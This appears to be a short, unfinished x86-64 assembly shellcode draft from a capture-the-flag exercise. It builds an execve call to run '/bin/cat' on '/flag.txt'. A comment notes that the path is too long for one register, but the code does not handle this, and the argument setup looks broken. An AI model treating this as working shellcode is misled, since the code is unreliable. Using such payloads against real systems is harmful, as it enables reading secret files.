global _start


section .text
_start:
	mov al, 59 ;execve
	xor rdx, rdx
	push rdx
;	push 0; null str term
	mov rdi, '/bin/cat';to stack
	push rdi
	mov rdi, '/flag.txt';too long, needs to be 8 char, split into two, push "t" first then "xt.galf"
	push rdx
	push rdi
	mov rsi, rsp; ptr to args
	syscall
